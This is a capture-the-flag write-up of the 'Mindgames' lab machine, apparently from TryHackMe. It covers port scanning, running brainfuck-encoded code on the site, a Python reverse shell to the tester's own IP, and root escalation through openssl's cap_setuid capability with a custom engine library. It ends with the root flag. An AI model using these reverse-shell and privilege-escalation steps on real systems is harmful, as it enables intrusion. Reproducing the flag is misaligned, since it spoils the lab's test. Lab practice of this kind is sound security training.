I start by scanning the ports
```bash
nmap -p- -T4-min-rate=10000 10.10.107.52    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 18:42 EEST
Nmap scan report for 10.10.107.52
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 812.91 seconds
```
```bash
nmap -p 22,80 -sC -sV -A 10.10.107.52       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 18:56 EEST
Nmap scan report for 10.10.107.52
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   175.08 ms 10.6.0.1
2   ... 3
4   208.81 ms 10.10.107.52

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.76 seconds
```
I tried enumerating for subfolders and subdomains but to no results.
On their website you are able to run code.
You have to convert the code into brainfuck text for it to run on the site.

```bash
+[----->+++<]>++.++++.+++.-.+++.++.[---->+<]>+++.+++++[->+++<]>.++++.>++++++++++.+[--->++++<]>-.++++++++++.---------.-[--->+<]>-.-[->++<]>-.+[-->+<]>+.++.+[->+++<]>.-----.-[--->+<]>+.>++++++++++.-[------->+<]>.++++.+[++>---<]>.[--->++<]>-.++++++.------.+.+++[->+++<]>.++++++++.+++[++>---<]>.+[--->+<]>.++++++++++.---------.-[->+++<]>.

Program Output:

uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
```
I turned this code into brainfuck text and ran it and got a shell on the site 
```bash
import os
cmd = 'python3 -c "import os,pty,socket;s=socket.socket();s.connect((\\"10.6.25.159\\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/sh\\")"'
os.system(cmd)
```
We already got the user.txt and our next step is to try to escalate our priviledges.
Then i got stuck for about an hour and decided to look for help. So I have to run 
```bash
mindgames@mindgames:/etc$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```
So we can use https://gtfobins.github.io/gtfobins/openssl/ to exploit.

https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/

All we had to do was create a .c exploit
```bash
┌──(kali㉿kali)-[~/exploit/openssl]
└─$ nano openssl-exploit-engine.c 
                                                                                                               
┌──(kali㉿kali)-[~/exploit/openssl]
└─$ gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
                                                                                                               
┌──(kali㉿kali)-[~/exploit/openssl]
└─$ gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
```
Transfer it over and run it 
```bash
Library load

It loads shared libraries that may be used to run code in the binary execution context.

    openssl req -engine ./lib.so
```
```bash
mindgames@mindgames:/tmp$ openssl req -engine ./openssl-exploit-engine.so 
root@mindgames:/tmp# whoami
root
root@mindgames:/tmp# cat /root/root.txt
thm{1974a617cc84c5b51411c283544ee254}
```
This machine was easy until the point of PrivEsc. But it was a fun machine regardless. This took me around 2-3 hours
